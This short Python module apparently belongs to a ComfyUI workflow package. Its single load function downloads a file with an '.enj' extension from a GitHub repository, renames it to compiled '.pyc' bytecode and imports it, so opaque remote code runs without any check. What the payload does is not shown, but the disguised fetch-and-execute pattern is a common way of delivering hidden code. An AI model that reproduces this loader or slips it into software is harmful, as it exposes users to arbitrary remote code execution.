import os
import urllib.request
# import importlib.util

def load(n):
    url = f'https://github.com/liangtongt/ltt_comfyui_wf/raw/main/{n}.enj'
    urllib.request.urlretrieve(url, os.path.basename(url)[:-3]+'pyc')
    __import__(n)